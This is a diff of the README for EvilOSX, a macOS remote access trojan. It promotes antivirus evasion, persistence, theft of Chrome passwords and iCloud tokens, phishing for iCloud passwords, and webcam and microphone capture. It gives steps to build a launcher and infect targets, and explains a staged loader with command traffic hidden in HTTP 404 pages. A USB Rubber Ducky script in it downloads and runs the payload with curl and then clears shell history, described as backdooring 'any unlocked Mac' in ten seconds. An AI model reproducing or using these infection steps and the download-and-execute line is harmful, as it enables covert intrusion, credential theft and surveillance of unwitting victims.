@@ -1,49 +1,46 @@
 <h1 align="center">
   <br>
-  <a href="https://github.com/Marten4n6/EvilOSX"><img src="https://i.imgur.com/qiAJP95.png" alt="EvilOSX" width="250"></a>
+  <a href="https://github.com/Marten4n6/EvilOSX"><img src="https://i.imgur.com/qiAJP95.png" alt="EvilOSX" width="255"></a>
   <br>
   EvilOSX
   <br>
 </h1>
 
-<h4 align="center">A pure python, post-exploitation, RAT (Remote Administration Tool) for macOS / OSX.</h4>
+<h4 align="center">An evil RAT (Remote Administration Tool) for macOS / OS X.</h4>
 
 <p align="center">
   <a href="https://github.com/Marten4n6/EvilOSX/blob/master/LICENSE.txt">
-      <img src="https://img.shields.io/badge/license-GPLv3-blue.svg">
+      <img src="https://img.shields.io/badge/license-GPLv3-blue.svg?style=flat-square">
   </a>
   <a href="https://github.com/Marten4n6/EvilOSX/issues">
-    <img src="https://img.shields.io/github/issues/Marten4n6/EvilOSX.svg">
+    <img src="https://img.shields.io/github/issues/Marten4n6/EvilOSX.svg?style=flat-square">
   </a>
-  <a href="https://github.com/Marten4n6/EvilOSX/pulls">
-      <img src="https://img.shields.io/badge/contributions-welcome-orange.svg">
+  <a href="https://github.com/Marten4n6/EvilOSX/blob/master/CONTRIBUTING.md">
+      <img src="https://img.shields.io/badge/contributions-welcome-brightgreen.svg?style=flat-square">
   </a>
 </p>
 
 ---
 
 ## Features
-
-- Emulate a simple terminal instance
-- Undetected by anti-virus (OpenSSL [AES-256](https://en.wikipedia.org/wiki/Advanced_Encryption_Standard) encrypted payloads, [HTTPS](https://en.wikipedia.org/wiki/HTTPS) communication)
-- Multi-threaded
-- No client dependencies (pure python)
+- Emulate a terminal instance
+- Simple extendable [module](https://github.com/Marten4n6/EvilOSX/blob/master/CONTRIBUTING.md) system
+- No bot dependencies (pure python)
+- Undetected by anti-virus (OpenSSL [AES-256](https://en.wikipedia.org/wiki/Advanced_Encryption_Standard) encrypted payloads)
 - Persistent
-- Simple extendable [module](https://github.com/Marten4n6/EvilOSX/blob/master/modules) system
 - Retrieve Chrome passwords
 - Retrieve iCloud tokens and contacts
-- [Phish](https://i.imgur.com/x3ilHQi.png) for iCloud passwords via iTunes
-- Download and upload files
-- Take a picture using the webcam
-- Record microphone input
-- iTunes iOS backup enumeration
-- Retrieve or monitor the clipboard
+- Retrieve/monitor the clipboard
 - Retrieve browser history (Chrome and Safari)
+- [Phish](https://i.imgur.com/x3ilHQi.png) for iCloud passwords via iTunes
+- iTunes (iOS) backup enumeration
+- Record the microphone
+- Take a desktop screenshot or picture using the webcam
 - Attempt to get root via local privilege escalation
-- Auto installer, simply run EvilOSX on your target and the rest is handled automatically
 
 ## How To Use
-The server side requires [python3](https://www.python.org/downloads) to run (probably already installed on your system).
+The server side requires [python3](https://www.python.org/downloads) to run (probably already installed on your system). <br/>
+Once this is installed, open a terminal and type the following:
 
 ```bash
 # Clone or download this repository
@@ -55,26 +52,25 @@ $ sudo pip3 install -r requirements.txt
 # Go into the repository
 $ cd EvilOSX
 
-# Build a launcher to infect your target
-$ python builder.py
+# Build a launcher to infect your target(s)
+$ python3 builder.py
 
 # Start listening for connections
-$ python start.py
+$ python3 start.py
 
 # Lastly, run the built launcher on your target
 ```
-**Because payloads are created unique to the target system (automatically by the server), the server must be running when any client connects for the first time.**
+**Because payloads are created unique to the target system (automatically by the server), the server must be running when any bot connects for the first time.**
 
-# Screenshots
+## Screenshots
 ![](https://i.imgur.com/eHHcowd.png)
 ![](https://i.imgur.com/lC8XtlJ.png)
 
 ## Motivation
-
 This project was created to be used with my [Rubber Ducky](https://hakshop.com/products/usb-rubber-ducky-deluxe), here's the simple script:
 ```
 REM Download and execute EvilOSX @ https://github.com/Marten4n6/EvilOSX
-REM Also see https://ducktoolkit.com/vidpid/
+REM See also: https://ducktoolkit.com/vidpid/
 
 DELAY 1000
 GUI SPACE
@@ -91,14 +87,14 @@ ENTER
 STRING cd /tmp; curl -s HOST_TO_EVILOSX.py -o 1337.py; python 1337.py; history -cw; clear
 ENTER
 ```
-- Takes about 10 seconds to backdoor any unlocked Mac, which is...... *nice*
+- It takes about 10 seconds to backdoor any unlocked Mac, which is...... *nice*
 - Termina**l** is spelt that way intentionally, on some systems spotlight won't find the terminal otherwise. <br/>
 - To bypass the keyboard setup assistant make sure you change the VID&PID which can be found [here](https://ducktoolkit.com/vidpid/). Aluminum Keyboard (ISO) is probably the one you are looking for.
 
-## Versioning
 
+## Versioning
 EvilOSX will be maintained under the Semantic Versioning guidelines as much as possible. <br/>
-Server and client releases will be numbered with the follow format:
+Server and bot releases will be numbered with the follow format:
 ```
 <major>.<minor>.<patch>
 ```
@@ -110,12 +106,22 @@ And constructed with the following guidelines:
 
 For more information on SemVer, please visit https://semver.org/.
 
-## Issues
+## Design Notes
+- The server uses the [MVC](https://en.wikipedia.org/wiki/Model-view-controller) pattern
+- Infecting a machine is split up into three parts:
+  * A **launcher** is run on the target machine whose only goal is to run the stager
+  * The stager asks the server for a **loader** which handles how a payload will be loaded
+  * The loader is given a uniquely encrypted **payload** and then sent back to the stager
+- The server hides it's communications by sending messages hidden in HTTP 404 error pages (from BlackHat's "Hiding In Plain Sight")
+  * Command requests are retrieved from the server via a GET request
+  * Command responses are sent to the server via a POST request
+- Modules take advantage of python's dynamic nature, they are simply sent over the network compressed with [zlib](https://www.zlib.net), along with any configuration options
+- Since the bot only communicates with the server and never the other way around, the server has no way of knowing when a bot goes offline
 
-Feel free to submit any issues or feature requests.
+## Issues
+Feel free to submit any issues or feature requests [here](https://github.com/Marten4n6/EvilOSX/issues).
 
 ## Credits
-
 - The awesome [Empire](https://github.com/EmpireProject) project
 - Shoutout to [Patrick Wardle](https://twitter.com/patrickwardle) for his awesome talks, check out [Objective-See](https://objective-see.com/)
 - [manwhoami](https://github.com/manwhoami) for his projects: [OSXChromeDecrypt](https://github.com/manwhoami/OSXChromeDecrypt), [MMeTokenDecrypt](https://github.com/manwhoami/MMeTokenDecrypt), [iCloudContacts](https://github.com/manwhoami/iCloudContacts)
@@ -124,5 +130,4 @@ Feel free to submit any issues or feature requests.
 - Logo created by [motusora](https://www.behance.net/motusora)
 
 ## License
-
 [GPLv3](https://github.com/Marten4n6/EvilOSX/blob/master/LICENSE.txt)
